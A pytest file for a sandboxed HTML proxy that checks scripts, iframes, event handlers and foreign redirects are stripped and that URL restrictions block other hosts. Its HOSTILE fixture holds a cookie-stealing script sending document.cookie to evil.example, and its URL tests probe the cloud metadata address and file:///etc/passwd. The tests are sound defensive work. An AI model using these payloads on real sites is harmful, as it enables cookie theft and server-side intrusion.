"""The report's 'page without JavaScript' view: an HTML proxy of a third-party page, so its limits are tested as carefully as its output."""
from __future__ import annotations

import pytest
from sqlmodel import Session

from app.api import pages

from app.repo.models import Scan, Site
from tests.conftest import html_page
from tests.test_api_pipeline import TXT, make_client

@pytest.fixture(autouse=True)
def _fresh_cache():
    pages._CACHE.clear()  # scan ids repeat across the in-memory databases of different tests


HOSTILE = (
    "<html><head><title>Cars</title><base href='https://evil.example/'><meta http-equiv='refresh' content='0;url=https://evil.example/'>"
    "<script>fetch('https://evil.example/steal?c='+document.cookie)</script></head>"
    "<body onload='steal()'><h1>Stock</h1><a href='javascript:alert(1)' onclick='steal()'>Buy</a>"
    "<a href='/car/1'>Golf 17.900 EUR</a><iframe src='https://evil.example/frame'></iframe>"
    "<form action='https://evil.example/post' method='post'><input name='x'></form><noscript>No script text</noscript></body></html>"
)


def setup(extra_routes=None, ignore_robots=False, urls=("https://a.example/stoc/", "https://www.a.example/stoc/x")):
    routes = {"a.example/stoc/": html_page(HOSTILE), "a.example/secret": html_page("<html><body>secret</body></html>"), **(extra_routes or {})}
    c, web, engine = make_client(routes)
    with c:
        pass
    with Session(engine) as s:
        site = Site(domain="a.example", canonical_origin="https://a.example")
        s.add(site); s.commit(); s.refresh(site)
        report = {"coverage": {"discovery": {"pages": [{"url": u, "role": "stock_list"} for u in urls]}}, "results": [
            {"check_id": "inv.vdp_urls", "pages": ["https://a.example/car/1"], "details": {}}]}
        sc = Scan(site_id=site.id, status="completed", report=report, ignore_robots=ignore_robots)
        s.add(sc); s.commit(); s.refresh(sc)
        return c, web, sc.id


def test_the_page_is_served_without_anything_that_can_run_or_post():
    c, web, sid = setup()
    with c:
        r = c.get(f"/api/scans/{sid}/page", params={"url": "https://a.example/stoc/"})
    assert r.status_code == 200 and "Golf 17.900 EUR" in r.text and "No script text" in r.text
    low = r.text.lower()
    assert "<script" not in low and "<iframe" not in low and "onclick" not in low and "onload" not in low and "javascript:" not in low
    assert "evil.example/'" not in r.text and "http-equiv" not in low  # their <base> and meta refresh are gone
    assert low.count("<base") == 1 and "<base href=\"https://a.example/stoc/\"" in low  # only ours
    csp = r.headers["content-security-policy"]
    assert csp.startswith("sandbox;") and "script-src 'none'" in csp and "form-action 'none'" in csp and "frame-ancestors 'self'" in csp
    assert r.headers["x-content-type-options"] == "nosniff" and r.headers["referrer-policy"] == "no-referrer"
    assert {x.method for x in web.requests} == {"GET"}


def test_only_urls_the_scan_recorded_on_the_scanned_site_can_be_opened():
    c, web, sid = setup()
    with c:
        get = lambda u: c.get(f"/api/scans/{sid}/page", params={"url": u})  # noqa: E731
        assert get("https://a.example/secret").status_code == 404           # same site, but the scan never opened it
        assert get("https://evil.example/stoc/").status_code == 404         # another host
        assert get("http://169.254.169.254/").status_code == 404            # internal address
        assert get("file:///etc/passwd").status_code == 404
        assert c.get("/api/scans/999/page", params={"url": "https://a.example/stoc/"}).status_code == 404
        assert get("https://a.example/car/1").status_code in (200, 502)     # recorded as check evidence
    assert not [r for r in web.requests if r.url.path == "/secret"]


def test_robots_txt_is_honoured_unless_the_scan_was_run_ignoring_it():
    routes = {"a.example/robots.txt": (200, TXT, "User-agent: *\nDisallow: /")}
    c, web, sid = setup(routes)
    with c:
        r = c.get(f"/api/scans/{sid}/page", params={"url": "https://a.example/stoc/"})
    assert r.status_code == 403 and "robots.txt" in r.text and not [x for x in web.requests if x.url.path == "/stoc/"]
    c, web, sid = setup(routes, ignore_robots=True)
    with c:
        r = c.get(f"/api/scans/{sid}/page", params={"url": "https://a.example/stoc/"})
    assert r.status_code == 200 and "Stock" in r.text


def test_unreachable_pages_give_a_readable_message_and_pages_are_cached():
    c, web, sid = setup()
    with c:
        gone = c.get(f"/api/scans/{sid}/page", params={"url": "https://a.example/car/1"})
        assert gone.status_code == 502 and "HTTP 404" in gone.text and gone.headers["content-security-policy"].startswith("sandbox")
        n = len(web.requests)
        c.get(f"/api/scans/{sid}/page", params={"url": "https://a.example/stoc/"})
        c.get(f"/api/scans/{sid}/page", params={"url": "https://a.example/stoc/"})
        assert len([r for r in web.requests[n:] if r.url.path == "/stoc/"]) == 1  # second view comes from the cache


def test_journey_steps_keep_what_the_agent_saw():
    import asyncio

    from tests.test_journey import good_find, run

    res, *_ = asyncio.run(run(good_find))
    steps = res["ux.j_find"].details["journey"]["steps"]
    assert all(s["view"] for s in steps)
    first = steps[0]["view"]
    assert first["links"] and first["links"][0]["i"] == 0 and "text" in first and "forms" in first and "structured_data" in first
    assert any(l["url"].endswith("/stoc/") for l in first["links"])  # the link the agent chose is in the view it chose from
